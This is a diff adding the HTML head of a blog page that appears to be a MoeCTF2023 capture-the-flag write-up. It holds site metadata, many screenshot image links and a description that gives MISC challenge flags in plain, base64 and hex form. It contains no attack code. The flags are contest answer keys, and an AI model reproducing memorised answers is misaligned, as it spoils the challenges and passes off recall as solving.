@@ -1,0 +1,761 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="MoeCTF2023MISCMISC入门指北bW9lY3Rme2hAdjNfZnVuX0B0X20xNWNfIX0&#x3D;moectf&amp;#123;h@v3_fun_@t_m15c_!&amp;#125; 打不开的图片1010查看发现文件头不是ffd8修改文件头ffd8保存查看exif属性6d6f656374667b5844555f69355f763372795f3665407532696675317d">
+<meta property="og:type" content="article">
+<meta property="og:title" content="W火火">
+<meta property="og:url" content="http://example.com/2023/10/13/MoeCTF2023/index.html">
+<meta property="og:site_name" content="W火火">
+<meta property="og:description" content="MoeCTF2023MISCMISC入门指北bW9lY3Rme2hAdjNfZnVuX0B0X20xNWNfIX0&#x3D;moectf&amp;#123;h@v3_fun_@t_m15c_!&amp;#125; 打不开的图片1010查看发现文件头不是ffd8修改文件头ffd8保存查看exif属性6d6f656374667b5844555f69355f763372795f3665407532696675317d">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1691993216086-1375fd6c-34f8-40d1-95aa-6ed9424f8e6a.png#averageHue=%23f7f7f7&clientId=u6a837453-95fb-4&from=paste&height=747&id=u5eab977e&originHeight=1868&originWidth=3660&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=298182&status=done&style=none&taskId=u129acc36-3ce3-4c56-ad4d-854c39dd59f&title=&width=1464">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1691993347738-844e20e3-22c6-4454-8b22-56ecd9909969.png#averageHue=%2337352f&clientId=u6a837453-95fb-4&from=paste&height=803&id=u04e26fa8&originHeight=2008&originWidth=2978&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=493760&status=done&style=none&taskId=u58d6478c-983d-48a1-8c18-fba73565bc4&title=&width=1191.2">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1691993388329-a26c6334-46f9-413d-93ff-b2a92437703d.png#averageHue=%23f5f4f1&clientId=u6a837453-95fb-4&from=paste&height=579&id=u8404ab0d&originHeight=1448&originWidth=2013&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=362820&status=done&style=none&taskId=u9b7fa86b-1732-430c-a662-c8c6df31eea&title=&width=805.2">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1691995132280-956eb309-6099-42e7-9375-3a5810213393.png#averageHue=%23d1d7cc&clientId=u13932080-eb19-4&from=paste&height=487&id=u0980b8c7&originHeight=1218&originWidth=2145&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=3232542&status=done&style=none&taskId=ub281c789-df3d-4fc8-b82b-62285d2680e&title=&width=858">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1691997020619-424fbe21-92b6-4193-b9eb-d24e32ad6935.png#averageHue=%23484742&clientId=u13932080-eb19-4&from=paste&height=803&id=ub75794c2&originHeight=2008&originWidth=2978&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=554711&status=done&style=none&taskId=uc17a2602-9d06-4d1f-a1c2-29bf342e409&title=&width=1191.2">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692083562915-ee708dff-8273-4c38-b8b2-a5dcdd4bdc6c.png#averageHue=%239c9ca0&clientId=u7da1720a-a5bf-4&from=paste&height=926&id=uce35b96c&originHeight=2315&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=707739&status=done&style=none&taskId=u8a411af7-1d05-47de-80ae-3bb4462cebb&title=&width=1536">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692084110065-17811044-e2f7-4ebd-8ef6-7614130c213a.png#averageHue=%231e1e1e&clientId=u7da1720a-a5bf-4&from=paste&height=920&id=u87f480f4&originHeight=2300&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=501352&status=done&style=none&taskId=u01ccf1b2-2634-404f-99e6-df94ba358c3&title=&width=1536">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692084285031-bbefa158-13ed-417f-8e17-21e6cf0eb0e6.png#averageHue=%231e1e1e&clientId=u7da1720a-a5bf-4&from=paste&height=920&id=u2a95398d&originHeight=2300&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=582785&status=done&style=none&taskId=u97bd10d4-edad-4cb3-813d-6178e179cc9&title=&width=1536">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692151255848-b3776ddd-2113-411e-8c8b-c7f462b8d004.png#averageHue=%23262626&clientId=uf860b47c-a3c5-4&from=paste&height=319&id=u5367fd2c&originHeight=798&originWidth=1955&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=232221&status=done&style=none&taskId=u1841aec4-1d74-4db8-83f6-a38439bce66&title=&width=782">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692151235933-0e8dc1d5-8118-4bea-9d9a-925df099190d.png#averageHue=%23242732&clientId=uf860b47c-a3c5-4&from=paste&height=809&id=ud1003ac2&originHeight=2023&originWidth=3470&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=1365313&status=done&style=none&taskId=u01cf8aad-ea18-4fa7-b190-991a93c6e78&title=&width=1388">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692103198101-bf074f12-297b-4f95-9d77-74fad865afbf.png#averageHue=%23212121&clientId=u802f4833-c821-4&from=paste&height=91&id=u8ae6237f&originHeight=228&originWidth=1700&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=28433&status=done&style=none&taskId=u7c9be098-3fa4-4bc4-a595-e891fe78a61&title=&width=680">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692103441836-c45be622-9241-42fa-ba38-9be30b5fa52a.png#averageHue=%23faf9f8&clientId=u802f4833-c821-4&from=paste&height=64&id=uc6a46804&originHeight=160&originWidth=1268&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=32109&status=done&style=none&taskId=u63b47b65-aa9f-4ad4-a51e-2f434364b35&title=&width=507.2">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692103145513-5bbd3852-22da-491c-b8b8-b1bf587ae591.png#averageHue=%23f1f1f1&clientId=u802f4833-c821-4&from=paste&height=847&id=ue3268263&originHeight=2118&originWidth=2040&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=392131&status=done&style=none&taskId=uf711bdfb-b2d7-46bb-899f-6cb3bac0e14&title=&width=816">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692091108119-bdfc1125-2544-4987-b997-bcc88fdec304.png#averageHue=%23f0efef&clientId=u802f4833-c821-4&from=paste&height=776&id=u5bcbd4dd&originHeight=1940&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=109162&status=done&style=none&taskId=u8f179507-ab41-46c2-b598-34bce661f5a&title=&width=1536">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692091113101-acd1a708-bd6a-4c62-85ad-fab80139b5b8.png#averageHue=%23f0efef&clientId=u802f4833-c821-4&from=paste&height=776&id=u323e6f86&originHeight=1940&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=134948&status=done&style=none&taskId=u01e2b44c-f0a3-4f73-85dc-d3b9bafdf5b&title=&width=1536">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692091136677-01814bc1-80ff-4a17-a6c6-37a008914dec.png#averageHue=%23eae4e2&clientId=u802f4833-c821-4&from=paste&height=854&id=u186aac59&originHeight=2135&originWidth=3728&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=505516&status=done&style=none&taskId=ud10ad6e1-b761-4fcc-8896-3da9f522884&title=&width=1491.2">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692091152936-69451fce-d900-42bf-b2d1-5b655f71d40d.png#averageHue=%23f0f0f0&clientId=u802f4833-c821-4&from=paste&height=776&id=uc2a7a231&originHeight=1940&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=111358&status=done&style=none&taskId=ued6cf01a-f69c-4da3-a980-88fcb656217&title=&width=1536">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692091165008-ed7a438e-f5c6-4f8a-8985-94a7191ee26e.png#averageHue=%23f0efef&clientId=u802f4833-c821-4&from=paste&height=776&id=uabad8e4d&originHeight=1940&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=329165&status=done&style=none&taskId=u34d7f2db-8a3a-4974-bb22-d35fcf798f3&title=&width=1536">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692196893041-c6cc31e7-c968-4539-a799-47b887810480.png#averageHue=%2353513f&clientId=ud1d0d7ad-59ad-4&from=paste&height=776&id=u9db2883a&originHeight=1940&originWidth=1463&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=4304406&status=done&style=none&taskId=ue6d6ff90-e0b6-49f0-a612-9d15d9763b3&title=&width=585.2">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692196906547-d3260e64-d8ed-458b-8ce4-62e0cf476a22.png#averageHue=%233f4d5e&clientId=ud1d0d7ad-59ad-4&from=paste&height=768&id=ue36bfd96&originHeight=1920&originWidth=1089&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=3560328&status=done&style=none&taskId=u81c90f32-6b6f-4fe8-a7af-d7e3ca294ac&title=&width=435.6">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692196954933-9fcf30ad-425b-4e08-95c8-24ed5cfeeedf.png#averageHue=%23424846&clientId=ud1d0d7ad-59ad-4&from=paste&height=516&id=u0bdd38a4&originHeight=1290&originWidth=1726&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=2733560&status=done&style=none&taskId=u1007fd5b-af94-403b-8ce3-a5598cd322d&title=&width=690.4">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692196989445-58de6dea-d937-45da-ac66-71cb87fb2eb1.png#averageHue=%23f5f4f3&clientId=ud1d0d7ad-59ad-4&from=paste&height=82&id=ufabf10b5&originHeight=204&originWidth=782&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=13408&status=done&style=none&taskId=u0af6e9e8-5902-40e7-97c6-04fbdabc27d&title=&width=312.8">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692197114226-b3c60cce-bdf0-4dbd-8c4b-7d8888835c47.png#averageHue=%23f7eedb&clientId=ud1d0d7ad-59ad-4&from=paste&height=602&id=u9e1a695b&originHeight=1506&originWidth=3358&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=807384&status=done&style=none&taskId=u02ff1f87-2d5a-4f11-9247-4bc5355191e&title=&width=1343.2">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692329277428-0b7af8da-8c58-476a-9e49-e82be054af0c.png#averageHue=%23011720&clientId=u228c62a0-891d-4&from=paste&height=189&id=u2a2eca4e&originHeight=473&originWidth=1798&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=1561887&status=done&style=none&taskId=ua0bc4102-2b69-4ae9-ad6e-2a756f55ad0&title=&width=719.2">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692329348922-f1d595ff-0da9-423a-ab4c-6db3c1d03ceb.png#averageHue=%231d203a&clientId=u228c62a0-891d-4&from=paste&height=809&id=ue19afaa2&originHeight=2023&originWidth=3470&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=4447689&status=done&style=none&taskId=ub6e01a9d-306a-4432-b868-01154f2f994&title=&width=1388">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692329362514-b74a6426-7632-4aca-8e0f-737d73bff698.png#averageHue=%2323252e&clientId=u228c62a0-891d-4&from=paste&height=809&id=u3f318eaf&originHeight=2023&originWidth=3470&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=171798&status=done&style=none&taskId=u5ab0d596-4ff0-4fb7-99af-da80769ddeb&title=&width=1388">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692329239991-c1654886-e430-42c8-ab60-a379567b733e.png#averageHue=%23fcfbfb&clientId=u228c62a0-891d-4&from=paste&height=812&id=ud3c779f3&originHeight=2030&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=616989&status=done&style=none&taskId=uf9b5da26-e572-4bd1-bfc5-0becbc4482d&title=&width=1536">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473288/1692413906966-39ab905a-6ca4-455f-9ea8-79400e6e3020.png#averageHue=%233f3d38&clientId=u77c829fb-348a-4&from=paste&height=87&id=ua63ffb4a&originHeight=109&originWidth=744&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=5964&status=done&style=none&taskId=u340c1242-4cf5-45bf-8a92-4dc16df935b&title=&width=595.2">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473288/1692414053821-2b81c571-14d3-4b90-a47d-432f9fbd8b14.png#averageHue=%232e2d2c&clientId=u77c829fb-348a-4&from=paste&height=51&id=u8a63c943&originHeight=64&originWidth=1488&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=8708&status=done&style=none&taskId=ue56861c4-ef56-417d-b074-5856a78141c&title=&width=1190.4">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473288/1692414095884-3ac930f0-f3fd-4b5f-af4d-bdf16125db84.png#averageHue=%23000000&clientId=u77c829fb-348a-4&from=paste&height=678&id=u304b8873&originHeight=847&originWidth=1284&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=58664&status=done&style=none&taskId=u42259810-80e9-46ee-93dd-26688548b99&title=&width=1027.2">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473288/1692509669426-5a9393d8-8732-41ba-9caa-c1fc6eb28789.png#averageHue=%23ababac&from=url&id=ILTOS&originHeight=133&originWidth=840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&status=done&style=none&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473288/1692509703473-49e919c2-28bd-4b48-99c8-46953a167abd.png?x-oss-process=image/resize,w_1875,limit_0#averageHue=%23adceb5&from=url&id=ZNkJw&originHeight=810&originWidth=1875&originalType=binary&ratio=2.5&rotation=0&showTitle=false&status=done&style=none&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473288/1692509777262-892c11b8-741a-4111-ab84-36a10b6083a6.png#averageHue=%23f1f1f1&from=url&id=UT6Mq&originHeight=700&originWidth=803&originalType=binary&ratio=2.5&rotation=0&showTitle=false&status=done&style=none&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692239727991-caa76376-0723-4ac0-968a-ed3b662e49d8.png#averageHue=%23edeceb&clientId=ued3674e1-1bde-4&from=paste&height=280&id=ua8b825f1&originHeight=700&originWidth=655&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=46406&status=done&style=none&taskId=ua5ed407a-3bf6-4ac3-8f1b-5c3e10be778&title=&width=262">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692241957628-378056c6-70bf-4d32-b1d4-2eed81451368.png#averageHue=%23faf9f9&clientId=ued3674e1-1bde-4&from=paste&height=928&id=u555474c0&originHeight=2320&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=661399&status=done&style=none&taskId=u51c0b1e7-ac53-4457-a441-21e535c3d34&title=&width=1536">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692253068952-fec9855a-5410-49db-9460-7edf482d8ddb.png#averageHue=%23f7f6f4&clientId=ucf983e31-0846-4&from=paste&height=926&id=u419528ac&originHeight=2315&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=1058284&status=done&style=none&taskId=u7f7013ec-93e3-43cc-8de2-62a6e1ab1fc&title=&width=1536">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692261151420-c9d2f24a-3a7a-45d6-a2cf-527e27422a67.png#averageHue=%23fcfcfc&clientId=u672bdedf-96b6-4&from=paste&height=926&id=u82682522&originHeight=2315&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=268996&status=done&style=none&taskId=ud8feb882-6a41-49af-ba69-16862764b5b&title=&width=1536">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692261162100-043fe995-dab0-4f21-a7c1-0053f5d6442f.png#averageHue=%231e1d1d&clientId=u672bdedf-96b6-4&from=paste&height=920&id=u211e67b7&originHeight=2300&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=510431&status=done&style=none&taskId=ub90abfaa-c690-46e5-8f1b-51dfffb6042&title=&width=1536">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692261193348-ea02c4d9-8e53-4f2a-aa50-931b117d709b.png#averageHue=%23fbfafa&clientId=u672bdedf-96b6-4&from=paste&height=928&id=u640f9187&originHeight=2320&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=606024&status=done&style=none&taskId=u86d1bce5-7d60-44ad-9e47-9dc837d3c84&title=&width=1536">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692261214522-7025d4b1-c4a0-4e75-93f1-397a97a97f1a.png#averageHue=%23fafafa&clientId=u672bdedf-96b6-4&from=paste&height=928&id=u0fb0c623&originHeight=2320&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=655483&status=done&style=none&taskId=u214bad7d-dda6-4220-b11e-17cb685a512&title=&width=1536">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692261400615-bbc48943-b017-4435-a94a-b36932837441.png#averageHue=%23faf9f9&clientId=u672bdedf-96b6-4&from=paste&height=928&id=uc2977104&originHeight=2320&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=672347&status=done&style=none&taskId=u6e408e88-6679-419c-8a76-f5106800bdb&title=&width=1536">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692261375394-0e7d9b56-2c2f-4c49-a72e-1a8599f60a69.png#averageHue=%23faf9f9&clientId=u672bdedf-96b6-4&from=paste&height=928&id=uad1f0a37&originHeight=2320&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=728928&status=done&style=none&taskId=u06c1880f-59eb-4d84-8565-61c97d79048&title=&width=1536">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692495793288-eb760ffd-e0a6-4d6c-938d-fae447326874.png#averageHue=%23fcfcfb&clientId=u6ed52949-f113-4&from=paste&height=926&id=xqkk1&originHeight=2315&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=241409&status=done&style=none&taskId=u1892ace6-db69-4b8a-a444-4cdf4e35f74&title=&width=1536">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473288/1692493779682-73bc8eec-f670-43c4-9c97-a843d2d4e8cf.png#averageHue=%23fdfcfc&from=url&id=TWB0q&originHeight=837&originWidth=1920&originalType=binary&ratio=2.5&rotation=0&showTitle=false&status=done&style=none&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473288/1692493939588-d4b4230e-72de-41b8-8193-6ea13dca8d31.png#averageHue=%23fdfbfa&from=url&id=n3DVh&originHeight=691&originWidth=1067&originalType=binary&ratio=2.5&rotation=0&showTitle=false&status=done&style=none&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692495779539-140acb6d-e1f6-45bb-8ee3-6f1abce28ccc.png#averageHue=%231b1b1b&clientId=u6ed52949-f113-4&from=paste&height=920&id=w1T8l&originHeight=2300&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=525915&status=done&style=none&taskId=u13f453f4-9cad-483a-a719-3ad92dd4022&title=&width=1536">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692237210264-1cd6439a-32d2-40e2-a90c-00f5db3f55ee.png#averageHue=%23fdfdfd&clientId=u77af9214-b2d4-4&from=paste&height=926&id=u92f35b14&originHeight=2315&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=144757&status=done&style=none&taskId=u917a859f-45f8-4362-be99-5f93d2fdf38&title=&width=1536">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692237234304-f324f5d3-5d4e-4afa-9f3a-df386d77161b.png#averageHue=%23fafafa&clientId=u77af9214-b2d4-4&from=paste&height=928&id=u5d46dabc&originHeight=2320&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=625585&status=done&style=none&taskId=u4efe4388-aa72-4a5a-8680-e85d443d186&title=&width=1536">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692237282437-e21a4d3b-6ef1-4976-9ffc-d91bfee3d0be.png#averageHue=%23f1f0f0&clientId=u77af9214-b2d4-4&from=paste&height=646&id=ua60e2d2e&originHeight=1615&originWidth=2570&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=266537&status=done&style=none&taskId=ud33394aa-21c8-4016-86d6-4dda6cf9ac4&title=&width=1028">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692498320543-490ee450-6ac0-4b52-829f-9fc79b62319a.png#averageHue=%23fcfcfc&clientId=u6ed52949-f113-4&from=paste&height=926&id=uc5feb40e&originHeight=2315&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=168969&status=done&style=none&taskId=u574bb24a-5ec1-484b-99bf-58ecaeaef19&title=&width=1536">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692535959282-7007b3e3-5167-4ef3-843e-62ec25ec14c6.png#averageHue=%23b9a082&clientId=u5aedd7ef-743a-4&from=paste&height=926&id=u2dd6491b&originHeight=2315&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=4088845&status=done&style=none&taskId=u63d0e9d7-a1b8-463d-a18e-8691fd4ece5&title=&width=1536">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692536014277-e7f6fc33-4c6c-4b85-9d30-f0d4c59e1a0b.png#averageHue=%23e4c89b&clientId=u5aedd7ef-743a-4&from=paste&height=926&id=u07f57a86&originHeight=2315&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=554818&status=done&style=none&taskId=u573dbdd4-159b-4451-998d-0e75e753317&title=&width=1536">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692535939947-e39b812e-7e6a-4db3-978a-1896119bc486.png#averageHue=%23fdfdfd&clientId=u5aedd7ef-743a-4&from=paste&height=926&id=ub50a16d1&originHeight=2315&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=222661&status=done&style=none&taskId=u2adfd428-2023-4b59-99a1-b8917afce90&title=&width=1536">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692535926243-dfeb1e76-0596-4524-883d-53eedb2fb362.png#averageHue=%23fdfdfc&clientId=u5aedd7ef-743a-4&from=paste&height=926&id=u6e8741f3&originHeight=2315&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=251144&status=done&style=none&taskId=u9ae00058-5142-4990-a29b-b5918f4b44c&title=&width=1536">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1695732733923-82541345-fa67-4005-9f99-da2c556c814a.png#averageHue=%23fbfafa&clientId=u7641a330-62a0-4&from=paste&height=318&id=ue4d83139&originHeight=796&originWidth=1386&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=67922&status=done&style=none&taskId=uedecde01-e814-4cda-8570-a4e05964cf9&title=&width=554.4">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1695732775558-25d1edb9-a712-404a-83d5-67eac1ebe6cf.png#averageHue=%23f6f6f6&clientId=u7641a330-62a0-4&from=paste&height=368&id=uac5c042a&originHeight=921&originWidth=1871&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=223676&status=done&style=none&taskId=uace95fee-09ec-4948-b8f0-5b05463f3df&title=&width=748.4">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1695732670298-267a7a52-7269-416c-b0aa-075d047c8484.png#averageHue=%23f7f5f5&clientId=u7641a330-62a0-4&from=paste&height=928&id=u466d664f&originHeight=2319&originWidth=3839&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=1042106&status=done&style=none&taskId=u276c2980-96cc-4b2a-b150-ea4b2aa53cc&title=&width=1535.6">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1693057440630-0092efc5-d9d4-4530-9ecb-9f03caadce92.png#averageHue=%23fcfbfb&clientId=u4c444f37-c33b-4&from=paste&height=564&id=u74a672b7&originHeight=1410&originWidth=2805&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=202448&status=done&style=none&taskId=u0bc0b580-9c44-476d-89f1-479eb6f8e61&title=&width=1122">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1693057518477-01471ef6-8d23-442a-8ec1-3087d9fc0cf1.png#averageHue=%23fefdfd&clientId=u4c444f37-c33b-4&from=paste&height=688&id=u43837f9b&originHeight=1720&originWidth=1570&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=202323&status=done&style=none&taskId=u2977616e-1e46-4a16-94b3-051651a5b0d&title=&width=628">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1696038164546-e761a2de-e0a2-4169-9f8a-7e9b337c49d9.png#averageHue=%23fbfbfa&clientId=u0b43effb-f7cd-4&from=paste&height=844&id=ub4d0a4fc&originHeight=2109&originWidth=3604&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=295748&status=done&style=none&taskId=uc0c695b2-9206-4431-9645-51c584924f7&title=&width=1441.6">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1696038199001-3801d2bf-4ff5-4508-af79-803429d37965.png#averageHue=%23f9f9f9&clientId=u0b43effb-f7cd-4&from=paste&height=518&id=u629a5d6e&originHeight=1296&originWidth=3434&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=405517&status=done&style=none&taskId=u11d90fde-9d21-407c-8e12-b8c55995ff4&title=&width=1373.6">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1696045611352-71a1b036-a467-4376-b133-cbb36365ebc7.png#averageHue=%2377b76d&clientId=u0b43effb-f7cd-4&from=paste&height=812&id=uaf579ebf&originHeight=2029&originWidth=3839&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=363617&status=done&style=none&taskId=udbde2fe8-8f80-4f9a-be09-b1fc571c610&title=&width=1535.6">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1696045676702-78c466af-ea77-4cfb-af01-dc4b5d16165a.png#averageHue=%23fefdfd&clientId=u0b43effb-f7cd-4&from=paste&height=440&id=u564ce922&originHeight=1101&originWidth=2396&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=142673&status=done&style=none&taskId=u9858db6a-4a16-4e95-aca6-8288e8bace4&title=&width=958.4">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1696051747520-39703a0e-86ab-4835-abb9-3091eaad8898.png#averageHue=%230e0d0d&clientId=u0b43effb-f7cd-4&from=paste&height=70&id=u14944c25&originHeight=174&originWidth=3769&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=40933&status=done&style=none&taskId=u14d336a4-e11b-4e6a-8f97-011814e7f8f&title=&width=1507.6">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1696051765058-ce0debf3-25d7-43a0-a8f2-2d91f5eb0a4f.png#averageHue=%23161514&clientId=u0b43effb-f7cd-4&from=paste&height=88&id=ud89f3c59&originHeight=221&originWidth=681&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=21644&status=done&style=none&taskId=uceec7c22-9935-40a8-8edd-6d79ac9aeb0&title=&width=272.4">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38473356/1696051776438-f0cbef0d-b445-489c-b16b-cae47cf05465.png#averageHue=%230f0f0e&clientId=u0b43effb-f7cd-4&from=paste&height=64&id=u814d1e96&originHeight=161&originWidth=3809&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=45220&status=done&style=none&taskId=u17af3386-326b-4d18-ab38-4b93d014828&title=&width=1523.6">
